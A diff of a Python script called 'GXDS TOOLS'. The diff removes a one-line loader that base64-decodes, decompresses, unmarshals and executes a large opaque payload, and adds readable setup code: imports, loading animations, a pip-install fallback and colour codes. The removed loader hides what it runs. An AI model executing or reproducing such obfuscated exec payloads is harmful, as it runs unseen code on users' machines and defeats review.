@@ -1,2 +1,337 @@
-# GXDS TOOLS
-_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'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'))
+import os, random, sys, json, uuid, time
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+
+gxdsanmtn1 = "|/-\\"
+gxdsanmtn2 = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
+gxdsanmtn3 = [
+    "[■□□□□□□□□□]",
+    "[■■□□□□□□□□]",
+    "[■■■□□□□□□□]",
+    "[■■■■□□□□□□]",
+    "[■■■■■□□□□□]",
+    "[■■■■■■□□□□]",
+    "[■■■■■■■□□□]",
+    "[■■■■■■■■□□]",
+    "[■■■■■■■■■□]",
+    "[■■■■■■■■■■]",
+]
+
+try:
+    import requests
+except ModuleNotFoundError:
+    for gxdsloading in range(10):
+        time.sleep(0.3)
+        sys.stdout.write("\r   LOADING: " + gxdsanmtn2[gxdsloading % len(gxdsanmtn2)])
+        sys.stdout.flush()
+        os.system("pip install requests -y")
+        os.system("pip install requests bs4 futures==2 > /dev/null")
+        import requests
+
+li = "\033[38;5;46m"
+blue = "\033[94m"
+white = "\033[0;97m"
+cyan = "\033[1;36m"
+yellow = "\033[1;33m"
+light_red = "\033[1;31m"
+light_gray = "\033[1;37m"
+light_purple = "\033[1;35m"
+light_green = "\033[1;32m"
+
